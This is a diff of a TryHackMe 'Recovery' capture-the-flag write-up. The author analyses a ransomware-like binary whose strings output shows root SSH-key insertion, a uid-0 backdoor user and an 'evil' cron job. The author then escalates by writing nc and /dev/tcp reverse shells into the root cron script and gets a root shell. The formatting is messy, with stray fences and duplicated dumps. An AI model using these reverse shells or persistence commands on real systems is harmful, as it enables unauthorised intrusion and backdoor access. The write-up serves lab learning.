@@ -45,62 +45,204 @@ Your friend Alex</p>
 <code>THM{d8b5c89061ed767547a782e0f9b0b0fe}</code></p>
 
 <br>
-<br>
+<h2>Nmap</h2>
 
 ```bash
-:~/Recovery# ssh alex@recovery
+:~/Recovery# nmap -sT -p- -T4 xx.xxx.xx.xx
+...
+PORT      STATE SERVICE
+22/tcp    open  ssh
+80/tcp    open  http
+1337/tcp  open  waste
+65499/tcp open  unknown
 ```
 
-![image](https://github.com/user-attachments/assets/322a470b-6d87-484c-92f3-c38ef0b3c1ed)
+<h2>xx.xxx.xx.xx:1337</h2>
 
-![image](https://github.com/user-attachments/assets/e5f17af3-6047-4406-a149-bfde00db8f40)
+<img width="1078" height="146" alt="image" src="https://github.com/user-attachments/assets/d6f51487-eec5-40e0-b68c-757cdd958d27" />
 
-<br>
+<h2>SSH</h2>
 
 ```bash
-:~/Recovery# scp -r alex@recovery:/home/alex/ .
+:~/Recovery# ssh alex@10.201.84.74
+...
+YOU DIDN'T SAY THE MAGIC WORD!
+YOU DIDN'T SAY THE MAGIC WORD!
+YOU DIDN'T SAY THE MAGIC WORD!
+YOU DIDN'T SAY THE MAGIC WORD!
+YOU DIDN'T SAY THE MAGIC WORD!
+...
 ```
 
-![image](https://github.com/user-attachments/assets/9c644579-c7d8-48df-9de7-da2e811012e9)
+
+```bash
+:~/Recovery# scp -r alex@xx.xxx.xx.xx:/home/alex/ .
+alex@10.201.84.74's password: 
+.profile                                                                                              100%  807     3.1MB/s   00:00    
+.bash_logout                                                                                          100%  220   976.3KB/s   00:00    
+.bashrc                                                                                               100% 3586    13.1MB/s   00:00    
+fixutil                                                                                               100%   36KB  29.1MB/s   00:00    
+```
 
 <p>
 	
 - edited <em>.bashrc</em><br>
 - deleted <code>while :; do echo "YOU DIDN’T SAY THE MAGIC WORD!"; done &</code></p>
 
-![image](https://github.com/user-attachments/assets/8f8e7564-bec3-48a5-a3a3-77d2d6ac511d)
-
-<br>
-
 ```bash
-:~/Recovery/alex# scp .bashrc alex@recovery:.bashrc
+cat .bashrc
+# ~/.bashrc: executed by bash(1) for non-login shells.
+# see /usr/share/doc/bash/examples/startup-files (in the package bash-doc)
+# for examples
+
+# If not running interactively, don't do anything
+case $- in
+    *i*) ;;
+      *) return;;
+esac
+
+# don't put duplicate lines or lines starting with space in the history.
+# See bash(1) for more options
+HISTCONTROL=ignoreboth
+
+# append to the history file, don't overwrite it
+shopt -s histappend
+
+# for setting history length see HISTSIZE and HISTFILESIZE in bash(1)
+HISTSIZE=1000
+HISTFILESIZE=2000
+
+# check the window size after each command and, if necessary,
+# update the values of LINES and COLUMNS.
+shopt -s checkwinsize
+
+# If set, the pattern "**" used in a pathname expansion context will
+# match all files and zero or more directories and subdirectories.
+#shopt -s globstar
+
+# make less more friendly for non-text input files, see lesspipe(1)
+#[ -x /usr/bin/lesspipe ] && eval "$(SHELL=/bin/sh lesspipe)"
+
+# set variable identifying the chroot you work in (used in the prompt below)
+if [ -z "${debian_chroot:-}" ] && [ -r /etc/debian_chroot ]; then
+    debian_chroot=$(cat /etc/debian_chroot)
+fi
+
+# set a fancy prompt (non-color, unless we know we "want" color)
+case "$TERM" in
+    xterm-color|*-256color) color_prompt=yes;;
+esac
+
+# uncomment for a colored prompt, if the terminal has the capability; turned
+# off by default to not distract the user: the focus in a terminal window
+# should be on the output of commands, not on the prompt
+#force_color_prompt=yes
+
+if [ -n "$force_color_prompt" ]; then
+    if [ -x /usr/bin/tput ] && tput setaf 1 >&/dev/null; then
+	# We have color support; assume it's compliant with Ecma-48
+	# (ISO/IEC-6429). (Lack of such support is extremely rare, and such
+	# a case would tend to support setf rather than setaf.)
+	color_prompt=yes
+    else
+	color_prompt=
+    fi
+fi
+
+if [ "$color_prompt" = yes ]; then
+    PS1='${debian_chroot:+($debian_chroot)}\[\033[01;32m\]\u@\h\[\033[00m\]:\[\033[01;34m\]\w\[\033[00m\]\$ '
+else
+    PS1='${debian_chroot:+($debian_chroot)}\u@\h:\w\$ '
+fi
+unset color_prompt force_color_prompt
+
+# If this is an xterm set the title to user@host:dir
+case "$TERM" in
+xterm*|rxvt*)
+    PS1="\[\e]0;${debian_chroot:+($debian_chroot)}\u@\h: \w\a\]$PS1"
+    ;;
+*)
+    ;;
+esac
+
+# enable color support of ls and also add handy aliases
+if [ -x /usr/bin/dircolors ]; then
+    test -r ~/.dircolors && eval "$(dircolors -b ~/.dircolors)" || eval "$(dircolors -b)"
+    alias ls='ls --color=auto'
+    #alias dir='dir --color=auto'
+    #alias vdir='vdir --color=auto'
+
+    #alias grep='grep --color=auto'
+    #alias fgrep='fgrep --color=auto'
+    #alias egrep='egrep --color=auto'
+fi
+
+# colored GCC warnings and errors
+#export GCC_COLORS='error=01;31:warning=01;35:note=01;36:caret=01;32:locus=01:quote=01'
+
+# some more ls aliases
+#alias ll='ls -l'
+#alias la='ls -A'
+#alias l='ls -CF'
+
+# Alias definitions.
+# You may want to put all your additions into a separate file like
+# ~/.bash_aliases, instead of adding them here directly.
+# See /usr/share/doc/bash-doc/examples in the bash-doc package.
+
+if [ -f ~/.bash_aliases ]; then
+    . ~/.bash_aliases
+fi
+
+# enable programmable completion features (you don't need to enable
+# this, if it's already enabled in /etc/bash.bashrc and /etc/profile
+# sources /etc/bash.bashrc).
+if ! shopt -oq posix; then
+  if [ -f /usr/share/bash-completion/bash_completion ]; then
+    . /usr/share/bash-completion/bash_completion
+  elif [ -f /etc/bash_completion ]; then
+    . /etc/bash_completion
+  fi
+fi
+
+
+while :; do echo "YOU DIDN'T SAY THE MAGIC WORD!"; done &
 ```
-![image](https://github.com/user-attachments/assets/0ca090e1-7eb9-4ded-8601-0825599b1d62)
 
 ```bash
-:~/Recovery/alex# scp .bashrc alex@recovery:.bashrc
-alex@recovery's password: 
-.bashrc                                                                                                   100% 3526     4.4MB/s   00:00    
+:~/Recovery/alex# scp .bashrc alex@10.201.84.74:.bashrc
+alex@10.201.84.74's password: 
+.bashrc                                                                                               100% 3528   104.7KB/s   00:00
+```
+
+```bash
 :~/Recovery/alex# ssh alex@recovery
 alex@recovery's password: 
-Linux recoveryserver 4.15.0-106-generic #107-Ubuntu SMP Thu...UTC 2020 x86_64
-
-The programs included with the Debian GNU/Linux system are free software;
-the exact distribution terms for each program are described in the
-individual files in /usr/share/doc/*/copyright.
-
-Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
-permitted by applicable law.
-Last login: Mon Jul  ... 2025 from TargetIP
+...
 alex@recoveryserver:~$ logout
 Connection to recovery closed.
 :~/Recovery/alex# 
 ```
 
-![image](https://github.com/user-attachments/assets/35d946fb-adc6-40df-85f3-110640171abf)
+<img width="1124" height="236" alt="image" src="https://github.com/user-attachments/assets/10bc34bd-80b4-462b-9b5c-cf7030ca69ac" />
 
 <br>
 <br>
+
+<p>1.1. Flag 0<br>
+<code>THM{d8b5c89061ed767547a782e0f9b0b0fe}</code></p>
+
+<br>
+<br>
+
+```bash
+alex@recoveryserver:~$ admin
+Welcome to the Recoverysoft Administration Tool! Please input your password:
+test
+Incorrect password! This will be logged!
+/bin/mv: cannot stat '/tmp/logging.so': No such file or directory
+alex@recoveryserver:~$ 
+```
 
 <p>1.2. Flag 1<br>
 <code>THM{4c3e355694574cb182ca3057a685509d}</code></p>
@@ -109,8 +251,10 @@ Connection to recovery closed.
 ```bash
 :~/Recovery/alex# file fixutil
 fixutil: ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=cc895c4c0b6852b9c57f08ecb87a232f0777f506, for GNU/Linux 3.2.0, not stripped
-...
-~/Recovery/alex# strings fixutil
+```
+
+```bash
+:~/Recovery/alex# strings fixutil
 /lib64/ld-linux-x86-64.so.2
 libc.so.6
 fopen
@@ -121,12 +265,61 @@ __cxa_finalize
 __libc_start_main
 GLIBC_2.2.5
 _ITM_deregisterTMCloneTable
-...
-usr/local/apache2/htdocs/
+__gmon_start__
+_ITM_registerTMCloneTable
+u+UH
+[]A\A]A^A_
+__gmon_start__
+_ITM_deregisterTMCloneTable
+_ITM_registerTMCloneTable
+__cxa_finalize
+web_location
+encryption_key_dir
+__stack_chk_fail
+GetWebFiles
+opendir
+strcmp
+strlen
+malloc
+exit
+strcpy
+strncat
+closedir
+readdir
+XORFile
+fopen
+fseek
+ftell
+fread
+fclose
+fwrite
+XOREncryptWebFiles
+mkdir
+fprintf
+free
+LogIncorrectAttempt
+system
+time
+srand
+chmod
+libc.so.6
+__xstat
+GLIBC_2.4
+GLIBC_2.2.5
+u+UH
+abcdefghH
+ijklmnopH
+qrstuvwxH
+yzABCDEFH
+GHIJKLMNH
+OPQRSTUVH
+WXYZ
+dH34%(
+/usr/local/apache2/htdocs/
 /opt/.fixutil/
 /opt/.fixutil/backup.txt
 /bin/mv /tmp/logging.so /lib/x86_64-linux-gnu/oldliblogging.so
-sh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQC4U9gOtekRWtwKBl3+ysB5WfybPSi/rpvDDfvRNZ+BL81mQYTMPbY3bD6u2eYYXfWMK6k3XsILBizVqCqQVNZeyUj5x2FFEZ0R+HmxXQkBi+yNMYoJYgHQyngIezdBsparH62RUTfmUbwGlT0kxqnnZQsJbXnUCspo0zOhl8tK4qr8uy2PAG7QbqzL/epfRPjBn4f3CWV+EwkkkE9XLpJ+SHWPl8JSdiD/gTIMd0P9TD1Ig5w6F0f4yeGxIVIjxrA4MCHMmo1U9vsIkThfLq80tWp9VzwHjaev9jnTFg+bZnTxIoT4+Q2gLV124qdqzw54x9AmYfoOfH9tBwr0+pJNWi1CtGo1YUaHeQsA8fska7fHeS6czjVr6Y76QiWqq44q/BzdQ9klTEkNSs+2sQs9csUybWsXumipViSUla63cLnkfFr3D9nzDbFHek6OEk+ZLyp8YEaghHMfB6IFhu09w5cPZApTngxyzJU7CgwiccZtXURnBmKV72rFO6ISrus= root@recovery
+ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQC4U9gOtekRWtwKBl3+ysB5WfybPSi/rpvDDfvRNZ+BL81mQYTMPbY3bD6u2eYYXfWMK6k3XsILBizVqCqQVNZeyUj5x2FFEZ0R+HmxXQkBi+yNMYoJYgHQyngIezdBsparH62RUTfmUbwGlT0kxqnnZQsJbXnUCspo0zOhl8tK4qr8uy2PAG7QbqzL/epfRPjBn4f3CWV+EwkkkE9XLpJ+SHWPl8JSdiD/gTIMd0P9TD1Ig5w6F0f4yeGxIVIjxrA4MCHMmo1U9vsIkThfLq80tWp9VzwHjaev9jnTFg+bZnTxIoT4+Q2gLV124qdqzw54x9AmYfoOfH9tBwr0+pJNWi1CtGo1YUaHeQsA8fska7fHeS6czjVr6Y76QiWqq44q/BzdQ9klTEkNSs+2sQs9csUybWsXumipViSUla63cLnkfFr3D9nzDbFHek6OEk+ZLyp8YEaghHMfB6IFhu09w5cPZApTngxyzJU7CgwiccZtXURnBmKV72rFO6ISrus= root@recovery
 /root/.ssh/authorized_keys
 /usr/sbin/useradd --non-unique -u 0 -g 0 security 2>/dev/null
 /bin/echo 'security:$6$he6jYubzsBX1d7yv$sD49N/rXD5NQT.uoJhF7libv6HLc0/EZOqZjcvbXDoua44ZP3VrUcicSnlmvWwAFTqHflivo5vmYjKR13gZci/' | /usr/sbin/chpasswd -e
@@ -136,8 +329,323 @@ for i in $(ps aux | grep bash | grep -v grep | awk '{print $2}'); do kill $i; do
 /etc/cron.d/evil
 * * * * * root /opt/brilliant_script.sh 2>&1 >/tmp/testlog
 :*3$"
-...
+GCC: (Ubuntu 9.3.0-10ubuntu2) 9.3.0
+/usr/lib/gcc/x86_64-linux-gnu/9/include
+/usr/include/x86_64-linux-gnu/bits
+/usr/include/x86_64-linux-gnu/bits/types
+/usr/include
+replacelogging.c
+stddef.h
+types.h
+struct_FILE.h
+FILE.h
+stdio.h
+sys_errlist.h
+struct_timespec.h
+dirent.h
+time.h
+unistd.h
+getopt_core.h
+stat.h
+dirent.h
+ssh_key
+_shortbuf
+_IO_lock_t
+stderr
+_IO_buf_end
+XORFile
+optopt
+_IO_write_end
+_freeres_list
+st_blksize
+_flags
+web_location
+encryption_file
+_markers
+__nlink_t
+max_amnt_webfiles
+d_name
+__timezone
+__ino_t
+stdout
+_IO_save_end
+/home/moodr/Boxes/recovery/fixutil
+opterr
+_IO_codecvt
+long long unsigned int
+st_blocks
+d_reclen
+sys_errlist
+_IO_backup_base
+sys_nerr
+f_contents
+webfile_w
+_fileno
+stat
+tv_nsec
+index_of_encryption_key
+__mode_t
+d_type
+webfile_r
+_IO_read_base
+st_gid
+stdin
+st_mode
+st_nlink
+attempt
+timespec
+__daylight
+_IO_marker
+_IO_read_ptr
+replacelogging.c
+st_ino
+_IO_write_base
+long long int
+_IO_save_base
+__dev_t
+webfile
+optind
+__syscall_slong_t
+_freeres_buf
+__pad0
+__pad5
+__glibc_reserved
+webfile_names
+XOREncryptWebFiles
+_vtable_offset
+optarg
+__gid_t
+dirent
+_IO_read_end
+short int
+st_mtim
+cron_f
+_IO_wide_data
+GNU C17 9.3.0 -mtune=generic -march=x86-64 -g -fpic -fasynchronous-unwind-tables -fstack-protector-strong -fstack-clash-protection -fcf-protection
+__environ
+encryption_key_dir
+d_off
+__blksize_t
+__uid_t
+st_atim
+_lock
+tv_sec
+GetWebFiles
+_old_offset
+_IO_FILE
+__dirstream
+script_f
+LogIncorrectAttempt
+unsigned char
+__tzname
+authorized_keys
+_IO_write_ptr
+rand_string
+__time_t
+st_size
+d_ino
+st_uid
+__off_t
+st_ctim
+st_dev
+short unsigned int
+stat_res
+f_path
+charset
+__blkcnt_t
+_chain
+st_rdev
+_flags2
+_cur_column
+__off64_t
+_unused2
+_IO_buf_base
+crtstuff.c
+deregister_tm_clones
+__do_global_dtors_aux
+completed.8059
+__do_global_dtors_aux_fini_array_entry
+frame_dummy
+__frame_dummy_init_array_entry
+replacelogging.c
+rand_string
+__FRAME_END__
+__stat
+_fini
+__dso_handle
+_DYNAMIC
+__GNU_EH_FRAME_HDR
+__TMC_END__
+_GLOBAL_OFFSET_TABLE_
+_init
+free@@GLIBC_2.2.5
+_ITM_deregisterTMCloneTable
+strcpy@@GLIBC_2.2.5
+mkdir@@GLIBC_2.2.5
+encryption_key_dir
+fread@@GLIBC_2.2.5
+fclose@@GLIBC_2.2.5
+opendir@@GLIBC_2.2.5
+GetWebFiles
+strlen@@GLIBC_2.2.5
+__stack_chk_fail@@GLIBC_2.4
+system@@GLIBC_2.2.5
+strncat@@GLIBC_2.2.5
+closedir@@GLIBC_2.2.5
+srand@@GLIBC_2.2.5
+LogIncorrectAttempt
+XORFile
+strcmp@@GLIBC_2.2.5
+fprintf@@GLIBC_2.2.5
+ftell@@GLIBC_2.2.5
+__gmon_start__
+time@@GLIBC_2.2.5
+__xstat@@GLIBC_2.2.5
+readdir@@GLIBC_2.2.5
+malloc@@GLIBC_2.2.5
+XOREncryptWebFiles
+fseek@@GLIBC_2.2.5
+chmod@@GLIBC_2.2.5
+web_location
+fopen@@GLIBC_2.2.5
+exit@@GLIBC_2.2.5
+fwrite@@GLIBC_2.2.5
+_ITM_registerTMCloneTable
+__cxa_finalize@@GLIBC_2.2.5
+.symtab
+.strtab
+.shstrtab
+.note.gnu.property
+.note.gnu.build-id
+.gnu.hash
+.dynsym
+.dynstr
+.gnu.version
+.gnu.version_r
+.rela.dyn
+.rela.plt
+.init
+.plt.got
+.plt.sec
+.text
+.fini
+.rodata
+.eh_frame_hdr
+.eh_frame
+.init_array
+.fini_array
+.dynamic
+.got.plt
+.data
+.bss
+.comment
+.debug_aranges
+.debug_info
+.debug_abbrev
+.debug_line
+.debug_str
+/home/alex/.bashrc
+while :; do echo "YOU DIDN'T SAY THE MAGIC WORD!"; done &
+/bin/cp /lib/x86_64-linux-gnu/liblogging.so /tmp/logging.so
+/lib/x86_64-linux-gnu/liblogging.so
+echo pwned | /bin/admin > /dev/null
+:*3$"
+GCC: (Ubuntu 9.3.0-10ubuntu2) 9.3.0
+crtstuff.c
+deregister_tm_clones
+__do_global_dtors_aux
+completed.8059
+__do_global_dtors_aux_fini_array_entry
+frame_dummy
+__frame_dummy_init_array_entry
+fixutil.c
+bin2c_liblogging_so
+__FRAME_END__
+__init_array_end
+_DYNAMIC
+__init_array_start
+__GNU_EH_FRAME_HDR
+_GLOBAL_OFFSET_TABLE_
+__libc_csu_fini
+_ITM_deregisterTMCloneTable
+_edata
+fclose@@GLIBC_2.2.5
+system@@GLIBC_2.2.5
+__libc_start_main@@GLIBC_2.2.5
+__data_start
+__gmon_start__
+__dso_handle
+_IO_stdin_used
+__libc_csu_init
+__bss_start
+main
+fopen@@GLIBC_2.2.5
+fwrite@@GLIBC_2.2.5
+__TMC_END__
+_ITM_registerTMCloneTable
+__cxa_finalize@@GLIBC_2.2.5
+.symtab
+.strtab
+.shstrtab
+.interp
+.note.gnu.property
+.note.gnu.build-id
+.note.ABI-tag
+.gnu.hash
+.dynsym
+.dynstr
+.gnu.version
+.gnu.version_r
+.rela.dyn
+.rela.plt
+.init
+.plt.got
+.plt.sec
+.text
+.fini
+.rodata
+.eh_frame_hdr
+.eh_frame
+.init_array
+.fini_array
+.dynamic
+.data
+.bss
+.comment
 ```
+
+
+
+alex@recoveryserver:/etc/cron.d$ ls
+evil
+```
+
+alex@recoveryserver:/etc/cron.d$ cat evil
+
+* * * * * root /opt/brilliant_script.sh 2>&1 >/tmp/testlog
+```
+
+
+alex@recoveryserver:~$ find / type -name brilliant*.* 2>/dev/null
+/opt/brilliant_script.sh
+```
+
+
+alex@recoveryserver:/opt$ nano brilliant_script.sh
+alex@recoveryserver:/opt$ cat brilliant_script.sh
+#!/bin/sh
+
+for i in $(ps aux | grep bash | grep -v grep | awk '{print $2}'; do kill $i; done;
+alex@recoveryserver:/opt$ /bin/bash
+bash-5.0$
+
+Flag 1: THM{4c3e355694574cb182ca3057a685509d}
+
+
+<img width="1127" height="261" alt="image" src="https://github.com/user-attachments/assets/856091c5-c901-446d-9553-4bce34242c74" />
+
+
+
 
 <p><code>/bin/echo 'security:$6$he6jYubzsBX1d7yv$sD49N/rXD5NQT.uoJhF7libv6HLc0/EZOqZjcvbXDoua44ZP3VrUcicSnlmvWwAFTqHflivo5vmYjKR13gZci/' | /usr/sbin/chpasswd -e</code></p>
 
@@ -174,6 +682,400 @@ bash-5.0#
 
 <br>
 <br>
+
+alex@recoveryserver:/opt$ /bin/bash
+bash-5.0$ find / -type f -name *.html 2>/dev/null
+/usr/local/apache2/htdocs/index.html
+/usr/local/apache2/htdocs/todo.html
+/usr/local/apache2/icons/README.html
+/usr/local/apache2/error/include/spacer.html
+/usr/local/apache2/error/include/top.html
+/usr/local/apache2/error/include/bottom.html
+bash-5.0$ 
+
+
+
+bash-5.0$ find / -type f -newermt 20-06-15 ! -newermt 2020-06-19 -exec ls -la {} \; 2> /dev/null
+-rwsr-xr-x 1 root root 16928 Jun 17  2020 /bin/admin
+-rw-r--r-- 1 root root 32032 Jun 17  2020 /var/log/faillog
+-rw-r--r-- 1 root root 0 Jun 17  2020 /var/lib/sudo/lectured/alex
+-rw-r--r-- 1 root root 1376 Jun 17  2020 /etc/passwd-
+-rw-r----- 1 root shadow 970 Jun 17  2020 /etc/shadow-
+-rw-r--r-- 1 root root 1415 Jun 17  2020 /etc/passwd
+-rw-r--r-- 1 root root 40 Jun 17  2020 /etc/subgid
+-rw-r--r-- 1 root root 615 Jun 17  2020 /etc/group
+-rw-r--r-- 1 root root 40 Jun 17  2020 /etc/subuid
+-rw-r----- 1 root shadow 515 Jun 17  2020 /etc/gshadow
+-rw-r--r-- 1 root root 18 Jun 17  2020 /etc/subgid-
+-rw-r--r-- 1 root root 18 Jun 17  2020 /etc/subuid-
+---------- 1 root root 0 Jun 17  2020 /run/crond.reboot
+-rwxr-xr-x 1 alex alex 16048 Jun 17  2020 /lib/x86_64-linux-gnu/oldliblogging.so
+-rwxrwxrwx 1 root root 23176 Jun 17  2020 /lib/x86_64-linux-gnu/liblogging.so
+
+
+bash-5.0$ cd /lib/x86_64-linux-gnu/
+
+:~/Recovery# scp -r alex@10.201.84.74:/lib/x86_64-linux-gnu/liblogging.so .
+alex@10.201.84.74's password: 
+liblogging.so                                                                                                     100%   23KB  37.0MB/s   00:00    
+root@ip-10-201-71-208:~/Recovery# 
+
+
+
+system("/bin/mv /tmp/logging.so /lib/x86_64-linux-gnu/oldliblogging.so");
+
+<img width="1308" height="379" alt="image" src="https://github.com/user-attachments/assets/f17fb1b1-f16b-4e7b-89bc-a81ca0b551dd" />
+
+
+
+bash-5.0$ cat brilliant_script.sh
+#!/bin/sh
+
+rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.201.71.208 52222 >/tmp/f
+bash-5.0$ 
+
+
+
+root@ip-10-201-71-208:~/Recovery/alex# nc -nlvp 52222
+Listening on 0.0.0.0 52222
+Connection received on 10.201.84.74 33474
+/bin/sh: 0: can't access tty; job control turned off
+# id
+uid=0(root) gid=0(root) groups=0(root)
+# which python3
+# pwd
+/root
+# ls
+init_script.sh
+# ls -lah
+total 32K
+drwx------ 1 root root 4.0K Jun 17  2020 .
+drwxr-xr-x 1 root root 4.0K Jun 17  2020 ..
+-rw-r--r-- 1 root root  570 Jan 31  2010 .bashrc
+-rw-r--r-- 1 root root  148 Aug 17  2015 .profile
+drwxr-xr-x 1 root root 4.0K Jun 17  2020 .ssh
+-rwxrwxr-x 1 root root   54 Jun 17  2020 init_script.sh
+# 
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+bash-5.0$ cat > /tmp/a.sh <<"EOF"
+> #!/bin/bash
+> bash -i >& /dev/tcp/10.201.71.208/52222 0>&1
+> EOF
+bash-5.0$ echo "bash /tmp/a.sh" >> /opt/brilliant_script.sh
+bash-5.0$ 
+
+
+"ssh-rsaAAAAB3NzaC1yc2EAAAADAQABAAABgQC4U9gOtekRWtwKBl3+ysB5WfybPSi/rpvDDfvRNZ+BL81mQYTMPbY3bD6u2eYYXfWMK6k3XsILBizVqCqQVNZeyUj5x2FFEZ0R+HmxXQkBi+yNMYoJYgHQyngIezdBsparH62RUTfmUbwGlT0kxqnnZQsJbXnUCspo0zOhl8tK4qr8uy2PAG7QbqzL/epfRPjBn4f3CWV+EwkkkE9XLpJ+SHWPl8JSdiD/gTIMd0P9TD1Ig5w6F0f4yeGxIVIjxrA4MCHMmo1U9vsIkThfLq80tWp9VzwHjaev9jnTFg+bZnTxIoT4+Q2gLV124qdqzw54x9AmYfoOfH9tBwr0+pJNWi1CtGo1YUaHeQsA8fska7fHeS6czjVr6Y76QiWqq44q/BzdQ9klTEkNSs+2sQs9csUybWsXumipViSUla63cLnkfFr3D9nzDbFHek6OEk+ZLyp8YEaghHMfB6IFhu09w5cPZApTngxyzJU7CgwiccZtXURnBmKV72rFO6ISrus= root@recovery"
+
+
+<img width="1051" height="391" alt="image" src="https://github.com/user-attachments/assets/acdbceff-99e0-480f-9679-dba7058cea49" />
+
+
+
+bash-5.0$ strings liblogging.so
+__gmon_start__
+_ITM_deregisterTMCloneTable
+_ITM_registerTMCloneTable
+__cxa_finalize
+web_location
+encryption_key_dir
+__stack_chk_fail
+GetWebFiles
+opendir
+strcmp
+strlen
+malloc
+exit
+strcpy
+strncat
+closedir
+readdir
+XORFile
+fopen
+fseek
+ftell
+fread
+fclose
+fwrite
+XOREncryptWebFiles
+mkdir
+fprintf
+free
+LogIncorrectAttempt
+system
+time
+srand
+chmod
+libc.so.6
+__xstat
+GLIBC_2.4
+GLIBC_2.2.5
+u+UH
+abcdefghH
+ijklmnopH
+qrstuvwxH
+yzABCDEFH
+GHIJKLMNH
+OPQRSTUVH
+WXYZ
+dH34%(
+/usr/local/apache2/htdocs/
+/opt/.fixutil/
+/opt/.fixutil/backup.txt
+/bin/mv /tmp/logging.so /lib/x86_64-linux-gnu/oldliblogging.so
+ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQC4U9gOtekRWtwKBl3+ysB5WfybPSi/rpvDDfvRNZ+BL81mQYTMPbY3bD6u2eYYXfWMK6k3XsILBizVqCqQVNZeyUj5x2FFEZ0R+HmxXQkBi+yNMYoJYgHQyngIezdBsparH62RUTfmUbwGlT0kxqnnZQsJbXnUCspo0zOhl8tK4qr8uy2PAG7QbqzL/epfRPjBn4f3CWV+EwkkkE9XLpJ+SHWPl8JSdiD/gTIMd0P9TD1Ig5w6F0f4yeGxIVIjxrA4MCHMmo1U9vsIkThfLq80tWp9VzwHjaev9jnTFg+bZnTxIoT4+Q2gLV124qdqzw54x9AmYfoOfH9tBwr0+pJNWi1CtGo1YUaHeQsA8fska7fHeS6czjVr6Y76QiWqq44q/BzdQ9klTEkNSs+2sQs9csUybWsXumipViSUla63cLnkfFr3D9nzDbFHek6OEk+ZLyp8YEaghHMfB6IFhu09w5cPZApTngxyzJU7CgwiccZtXURnBmKV72rFO6ISrus= root@recovery
+/root/.ssh/authorized_keys
+/usr/sbin/useradd --non-unique -u 0 -g 0 security 2>/dev/null
+/bin/echo 'security:$6$he6jYubzsBX1d7yv$sD49N/rXD5NQT.uoJhF7libv6HLc0/EZOqZjcvbXDoua44ZP3VrUcicSnlmvWwAFTqHflivo5vmYjKR13gZci/' | /usr/sbin/chpasswd -e
+/opt/brilliant_script.sh
+#!/bin/sh
+for i in $(ps aux | grep bash | grep -v grep | awk '{print $2}'); do kill $i; done;
+/etc/cron.d/evil
+* * * * * root /opt/brilliant_script.sh 2>&1 >/tmp/testlog
+:*3$"
+GCC: (Ubuntu 9.3.0-10ubuntu2) 9.3.0
+/usr/lib/gcc/x86_64-linux-gnu/9/include
+/usr/include/x86_64-linux-gnu/bits
+/usr/include/x86_64-linux-gnu/bits/types
+/usr/include
+replacelogging.c
+stddef.h
+types.h
+struct_FILE.h
+FILE.h
+stdio.h
+sys_errlist.h
+struct_timespec.h
+dirent.h
+time.h
+unistd.h
+getopt_core.h
+stat.h
+dirent.h
+ssh_key
+_shortbuf
+_IO_lock_t
+stderr
+_IO_buf_end
+XORFile
+optopt
+_IO_write_end
+_freeres_list
+st_blksize
+_flags
+web_location
+encryption_file
+_markers
+__nlink_t
+max_amnt_webfiles
+d_name
+__timezone
+__ino_t
+stdout
+_IO_save_end
+/home/moodr/Boxes/recovery/fixutil
+opterr
+_IO_codecvt
+long long unsigned int
+st_blocks
+d_reclen
+sys_errlist
+_IO_backup_base
+sys_nerr
+f_contents
+webfile_w
+_fileno
+stat
+tv_nsec
+index_of_encryption_key
+__mode_t
+d_type
+webfile_r
+_IO_read_base
+st_gid
+stdin
+st_mode
+st_nlink
+attempt
+timespec
+__daylight
+_IO_marker
+_IO_read_ptr
+replacelogging.c
+st_ino
+_IO_write_base
+long long int
+_IO_save_base
+__dev_t
+webfile
+optind
+__syscall_slong_t
+_freeres_buf
+__pad0
+__pad5
+__glibc_reserved
+webfile_names
+XOREncryptWebFiles
+_vtable_offset
+optarg
+__gid_t
+dirent
+_IO_read_end
+short int
+st_mtim
+cron_f
+_IO_wide_data
+GNU C17 9.3.0 -mtune=generic -march=x86-64 -g -fpic -fasynchronous-unwind-tables -fstack-protector-strong -fstack-clash-protection -fcf-protection
+__environ
+encryption_key_dir
+d_off
+__blksize_t
+__uid_t
+st_atim
+_lock
+tv_sec
+GetWebFiles
+_old_offset
+_IO_FILE
+__dirstream
+script_f
+LogIncorrectAttempt
+unsigned char
+__tzname
+authorized_keys
+_IO_write_ptr
+rand_string
+__time_t
+st_size
+d_ino
+st_uid
+__off_t
+st_ctim
+st_dev
+short unsigned int
+stat_res
+f_path
+charset
+__blkcnt_t
+_chain
+st_rdev
+_flags2
+_cur_column
+__off64_t
+_unused2
+_IO_buf_base
+crtstuff.c
+deregister_tm_clones
+__do_global_dtors_aux
+completed.8059
+__do_global_dtors_aux_fini_array_entry
+frame_dummy
+__frame_dummy_init_array_entry
+replacelogging.c
+rand_string
+__FRAME_END__
+__stat
+_fini
+__dso_handle
+_DYNAMIC
+__GNU_EH_FRAME_HDR
+__TMC_END__
+_GLOBAL_OFFSET_TABLE_
+_init
+free@@GLIBC_2.2.5
+_ITM_deregisterTMCloneTable
+strcpy@@GLIBC_2.2.5
+mkdir@@GLIBC_2.2.5
+encryption_key_dir
+fread@@GLIBC_2.2.5
+fclose@@GLIBC_2.2.5
+opendir@@GLIBC_2.2.5
+GetWebFiles
+strlen@@GLIBC_2.2.5
+__stack_chk_fail@@GLIBC_2.4
+system@@GLIBC_2.2.5
+strncat@@GLIBC_2.2.5
+closedir@@GLIBC_2.2.5
+srand@@GLIBC_2.2.5
+LogIncorrectAttempt
+XORFile
+strcmp@@GLIBC_2.2.5
+fprintf@@GLIBC_2.2.5
+ftell@@GLIBC_2.2.5
+__gmon_start__
+time@@GLIBC_2.2.5
+__xstat@@GLIBC_2.2.5
+readdir@@GLIBC_2.2.5
+malloc@@GLIBC_2.2.5
+XOREncryptWebFiles
+fseek@@GLIBC_2.2.5
+chmod@@GLIBC_2.2.5
+web_location
+fopen@@GLIBC_2.2.5
+exit@@GLIBC_2.2.5
+fwrite@@GLIBC_2.2.5
+_ITM_registerTMCloneTable
+__cxa_finalize@@GLIBC_2.2.5
+.symtab
+.strtab
+.shstrtab
+.note.gnu.property
+.note.gnu.build-id
+.gnu.hash
+.dynsym
+.dynstr
+.gnu.version
+.gnu.version_r
+.rela.dyn
+.rela.plt
+.init
+.plt.got
+.plt.sec
+.text
+.fini
+.rodata
+.eh_frame_hdr
+.eh_frame
+.init_array
+.fini_array
+.dynamic
+.got.plt
+.data
+.bss
+.comment
+.debug_aranges
+.debug_info
+.debug_abbrev
